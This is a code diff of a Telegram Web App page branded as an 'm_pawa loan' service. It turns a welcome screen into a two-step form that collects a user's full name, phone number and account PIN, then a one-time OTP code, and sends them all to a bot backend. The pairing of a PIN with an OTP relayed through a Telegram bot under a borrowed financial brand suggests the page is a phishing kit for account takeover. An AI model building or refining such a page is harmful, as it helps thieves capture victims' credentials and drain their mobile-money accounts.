@@ -7,53 +7,146 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
             background-color: #f4f6f9;
             margin: 0;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            padding: 15px;
+            color: #333;
         }
         .container {
             background: white;
             padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
             max-width: 400px;
-            width: 100%;
-            text-align: center;
+            margin: 0 auto;
         }
-        h2 { color: #2e7d32; margin-bottom: 5px; }
-        p { color: #555; font-size: 14px; }
-        .btn {
-            background-color: #2e7d32;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h2 { color: #2e7d32; margin: 0 0 5px 0; font-size: 24px; }
+        .header p { color: #666; margin: 0; font-size: 14px; }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 14px;
+            color: #444;
+        }
+        input {
             width: 100%;
-            margin-top: 15px;
-            font-weight: bold;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 15px;
+            background-color: #fafafa;
+        }
+        input:focus {
+            border-color: #2e7d32;
+            outline: none;
+            background-color: #fff;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h2>m_pawa loan</h2>
-        <p>Your Trusted Financial Partner</p>
-        <hr style="border: 0.5px solid #eee;">
-        <p>Welcome to the m_pawa dashboard.</p>
-        <button class="btn" onclick="tgClose()">Close App</button>
+        <div class="header">
+            <h2>m_pawa loan</h2>
+            <p>Registration & Verification</p>
+        </div>
+        
+        <form id="registerForm">
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" placeholder="Enter your full name" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="Enter phone number" required>
+            </div>
+
+            <div class="form-group">
+                <label for="pin">Create Account PIN (4 Digits)</label>
+                <input type="password" id="pin" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" placeholder="••••" required>
+            </div>
+        </form>
+
+        <form id="otpForm" class="hidden">
+            <p style="text-align: center; color: #666; font-size: 14px;">An OTP code has been sent to your phone number.</p>
+            <div class="form-group">
+                <label for="otpCode">Enter 6-Digit OTP Code</label>
+                <input type="text" id="otpCode" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder="123456" required>
+            </div>
+        </form>
     </div>
+
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        function tgClose() {
-            tg.close();
-        }
+
+        // Control variables
+        let currentStep = "REGISTER"; // Can be REGISTER or OTP
+
+        // Set up native Telegram bottom button
+        tg.MainButton.text = "CONTINUE TO VERIFY";
+        tg.MainButton.textColor = "#FFFFFF";
+        tg.MainButton.color = "#2e7d32";
+        tg.MainButton.show();
+
+        // Saved data storage
+        let userData = {};
+
+        tg.MainButton.onClick(function() {
+            if (currentStep === "REGISTER") {
+                const name = document.getElementById('fullName').value;
+                const phone = document.getElementById('phone').value;
+                const pin = document.getElementById('pin').value;
+
+                if(!name || !phone || pin.length < 4) {
+                    tg.showAlert("Please fill in all details and enter a 4-digit PIN.");
+                    return;
+                }
+
+                // Save step 1 data
+                userData.fullName = name;
+                userData.phoneNumber = phone;
+                userData.accountPin = pin;
+
+                // Hide step 1 layout, reveal the OTP layout
+                document.getElementById('registerForm').classList.add('hidden');
+                document.getElementById('otpForm').classList.remove('hidden');
+                
+                // Change button state
+                currentStep = "OTP";
+                tg.MainButton.text = "SUBMIT & REGISTER";
+            } 
+            else if (currentStep === "OTP") {
+                const otp = document.getElementById('otpCode').value;
+
+                if(otp.length < 6) {
+                    tg.showAlert("Please enter a valid 6-digit OTP code.");
+                    return;
+                }
+
+                // Append OTP to payload
+                userData.otpCode = otp;
+
+                // Package and pass the structured object back to your bot backend
+                tg.sendData(JSON.stringify(userData));
+                tg.close();
+            }
+        });
     </script>
 </body>
 </html>
